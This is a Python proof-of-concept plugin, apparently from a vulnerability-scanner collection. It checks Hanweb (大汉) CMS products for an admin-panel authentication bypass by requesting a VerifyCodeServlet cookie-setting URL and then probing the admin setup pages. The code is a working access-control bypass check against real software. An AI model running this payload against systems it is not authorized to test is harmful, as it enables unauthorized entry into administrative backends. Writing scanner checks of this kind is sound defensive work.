# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Hanweb_0002'  # 平台漏洞编号，留空
    name = '大汉管理后台权限绕过 命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        大汉科技（Hanweb）管理后台权限绕过，进入后台后轻松GetShell，
        经验证通杀所有系统和版本，包括：jcms，jact，jsearch，vipchat，vc，xxgk等等。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3280/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Hanweb(大汉)'  # 漏洞应用名称
    product_version = '大汉管理后台系统'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '638fb5a3-dbc5-4902-a6ce-f4a53a433aa4'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            paths = ['/vipchat/', '/jcms/',
                     '/jsearch/', '/jact/', '/vc/', '/xxgk/']
            payload = 'VerifyCodeServlet?var=cookie_username'
            admin_paths = ['/setup/opr_licenceinfo.jsp', '/setup/admin.jsp']
            for path in paths:
                verify_url = self.target + path + payload
                #code, head, res, errcode, _ = curl.curl2(url)
                r = requests.get(verify_url)
                if r.status_code == 200:
                    for admin_path in admin_paths:
                        admin_verify_url = self.target + path + admin_path
                        #code, head, res, errcode, _ = curl.curl2(adminurl)
                        r = requests.get(admin_verify_url)
                        if r.status_code == 200 and ('Licence' in r.text or 'admin' in r.text):
                            # security_hole(admin_verify_url)
                            self.output.report(self.vuln, '发现{target}存在{name}漏洞;url={url}'.format(
                                target=self.target, name=self.vuln.name, url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
